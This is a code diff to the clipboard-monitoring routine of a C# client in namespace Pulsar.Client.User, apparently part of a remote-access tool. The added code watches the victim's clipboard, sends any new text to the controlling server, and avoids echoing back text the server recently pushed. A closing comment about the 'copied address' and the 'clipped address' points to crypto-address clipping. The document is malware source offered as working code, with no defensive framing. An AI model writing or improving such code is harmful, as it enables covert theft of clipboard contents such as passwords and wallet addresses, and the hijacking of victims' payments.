@@ -56,7 +56,7 @@ namespace Pulsar.Client.User
 
             base.WndProc(ref m);
         }        
-          private void ClipboardCheck()
+        private void ClipboardCheck()
         {
             try
             {
@@ -70,11 +70,33 @@ namespace Pulsar.Client.User
                     {
                         return;
                     }
+
+                    bool isNewText = clipboardText != _lastClipboardText;
+                    Debug.WriteLine($"Is new text: {isNewText}");
                     
-                    if (clipboardText != _lastClipboardText)
+                    if (isNewText)
                     {
                         _lastClipboardText = clipboardText;
-                        _client.Send(new SetUserClipboardStatus { ClipboardText = clipboardText });
+
+                        Debug.WriteLine("New clipboard text detected, checking if should send to server...");
+
+                        bool wasRecentlyReceivedFromServer = 
+                            Messages.ClipboardHandler._lastReceivedClipboardText.Equals(clipboardText) &&
+                            (DateTime.Now - Messages.ClipboardHandler._lastReceivedTime).TotalSeconds < 2;
+                        
+                        Debug.WriteLine($"Was recently received from server: {wasRecentlyReceivedFromServer}");
+                        
+                        if (!wasRecentlyReceivedFromServer)
+                        {
+                            Debug.WriteLine("Client detected clipboard change, sending to server...");
+                            Debug.WriteLine($"Client detected clipboard change: {clipboardText.Substring(0, Math.Min(20, clipboardText.Length))}...");
+                            _client.Send(new SetUserClipboardStatus { ClipboardText = clipboardText });
+                        }
+                        else
+                        {
+                            Console.WriteLine("Clipboard change was from server (within 2s), not sending back");
+                            Debug.WriteLine($"Clipboard change was from server (within 2s), not sending back");
+                        }
                     }
 
                     // If the copied address is already the clipped address, updating the clipboard with the same address will be
